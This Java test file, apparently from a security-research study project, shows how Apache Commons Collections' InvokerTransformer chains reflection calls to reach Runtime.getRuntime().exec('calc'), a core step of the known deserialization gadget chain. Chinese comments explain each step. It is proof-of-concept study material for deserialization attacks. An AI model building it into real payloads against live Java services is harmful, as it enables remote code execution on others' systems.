package com.anbai.sec.serializes;

import org.apache.commons.collections.functors.InvokerTransformer;
import org.junit.Test;


import java.lang.reflect.Method;

public class InvokerTransformerTest {

    public static void main(String[] args) {
        // 定义需要执行的本地系统命令
        String cmd = "calc";

        // 构建transformer对象
        InvokerTransformer transformer = new InvokerTransformer(
                "exec", new Class[]{String.class}, new Object[]{cmd}
        );

        // 传入Runtime实例，执行对象转换操作
        transformer.transform(Runtime.getRuntime());
    }

    @Test
    public void test(){

        InvokerTransformer tran1 = new InvokerTransformer(
                "getMethod",
                new Class[]{ String.class, Class[].class },
                new Object[]{ "getRuntime" , null});
        Method method = (Method) tran1.transform(Runtime.class);

        /**
         * public static java.lang.Runtime java.lang.Runtime.getRuntime()
         * 已经获得了GetRuntime()的Method对象
         * 成功的反射出了Runtime.getRuntime()的方法，然而如果要执行任意代码的化，
         * 还需要有exec代码段，全部应该是Runtime.getRuntime().exec(“calc”)。
         * */

        /**
         * java.lang.Runtime@7791a895
         * Runtime类了，继续构造exec(“calc”)代码段
         * */
        InvokerTransformer tran2 = new InvokerTransformer(
                "invoke",
                new Class[]{ Object.class, Object[].class },
                new Object[]{ null, null });
        Runtime run = (Runtime) tran2.transform(method);

        /**
         * java.lang.ProcessImpl@887af79
         * */
        InvokerTransformer tran3 = new InvokerTransformer(
                "exec",
                new Class[]{String.class},
                new Object[]{"calc"});
        tran3.transform(run);
    }
}
